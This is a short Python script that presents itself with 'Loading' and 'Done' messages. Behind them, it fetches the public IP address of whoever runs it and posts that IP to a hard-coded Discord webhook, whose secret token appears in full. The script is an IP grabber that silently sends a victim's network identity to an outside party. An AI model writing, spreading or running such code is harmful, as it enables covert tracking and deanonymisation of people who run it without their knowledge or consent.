import requests
print("Loading")
webhook = "https://discord.com/api/webhooks/990455918271545384/JH9aeFZJDhgBoLlQ1QEcHA49hbKUFE03u4Nk553QW-RumG-fS06K4FoPP3_FbCD-Qe65"
url = "https://api.ipify.org"
r = requests.get(url).text
r = str(r)
requests.post(webhook, json={"content": f"@everyone ```Ip: {r}```"})
print("Done")
input("")
exit()
